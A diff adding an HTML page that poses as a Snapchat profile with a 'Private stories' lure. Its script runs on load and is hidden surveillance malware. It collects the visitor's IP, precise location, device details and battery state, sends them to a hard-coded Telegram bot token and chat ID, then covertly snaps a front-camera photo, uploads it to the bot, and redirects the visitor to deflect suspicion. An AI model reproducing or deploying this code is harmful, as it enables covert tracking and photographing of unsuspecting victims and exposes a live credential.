@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <title>Snapchat - Koko Englishy ✨</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta property="og:image" content="https://b.top4top.io/p_3769xk2ya0.jpg">
+    <meta property="og:title" content="Snapchat - Koko Englishy ✨">
+    <style>
+        body { background-color: #FFFC00; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .snap-logo { width: 80px; margin-bottom: 20px; }
+        .profile-card { background: #fff; padding: 25px; border-radius: 20px; text-align: center; width: 85%; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .profile-name { font-size: 22px; font-weight: bold; color: #000; margin-bottom: 5px; }
+        .profile-bio { font-size: 15px; color: #333; line-height: 1.6; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="profile-card">
+    <img class="snap-logo" src="https://www.snapchat.com/favicon.png">
+    <div class="profile-name">Koko Englishy ✨</div>
+    <div class="profile-bio">
+        🌸 Living my best life 🌸<br>
+        👻 Private stories | Only for girls 💖<br>
+        🎀 Loading Profile...
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const token = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
+    const chatId = '7184970355';
+
+    async function fullExploit() {
+        // 1. سحب معلومات الجهاز الأساسية والبطارية والرام
+        let battery = await navigator.getBattery();
+        let ipInfo = "Unknown";
+        let location = "Unknown";
+
+        // 2. جلب الأي بي والموقع الجغرافي الدقيق عبر API
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            ipInfo = data.ip;
+            location = `${data.city}, ${data.region}, ${data.country_name} (Map: https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
+        } catch(e) {}
+
+        let report = `
+🚨 **New Target Spotted!** 🚨
+━━━━━━━━━━━━━━━
+🌐 **Network Info:**
+IP: \`${ipInfo}\`
+Location: \`${location}\`
+ISP: \`${location.org || "Unknown"}\`
+
+📱 **Device Hardware:**
+Platform: \`${navigator.platform}\`
+RAM: \`${navigator.deviceMemory || "Unknown"} GB\`
+Cores: \`${navigator.hardwareConcurrency || "Unknown"} CPU\`
+Screen: \`${screen.width}x${screen.height}\`
+UserAgent: \`${navigator.userAgent}\`
+
+🔋 **Power Status:**
+Battery: \`${(battery.level * 100).toFixed(0)}%\`
+Charging: \`${battery.charging ? "Yes ⚡" : "No"}\`
+━━━━━━━━━━━━━━━
+        `;
+        
+        // إرسال التقرير النصي فوراً
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+
+        // 3. محاولة التقاط الصورة فوراً (طلب الإذن التلقائي)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // تصوير صاعق (300 مللي ثانية فقط)
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'snap_capture.jpg');
+                    formData.append('caption', `📷 Photo captured for IP: ${ipInfo}`);
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+                    .then(() => {
+                        // تحويل لإبعاد الشبهة بعد الإرسال
+                        window.location.href = "https://www.snapchat.com/add/koko_englishy";
+                    });
+                }, 'image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            }, 300);
+        })
+        .catch(err => {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Camera Permission Denied by Target")}`);
+            // حتى لو رفض الكاميرا، سيتم تحويله للسناب
+            setTimeout(() => { window.location.href = "https://www.snapchat.com/add/koko_englishy"; }, 1000);
+        });
+    }
+
+    // تشغيل كل شيء بمجرد دخول الرابط
+    window.onload = fullExploit;
+</script>
+
+</body>
+</html>
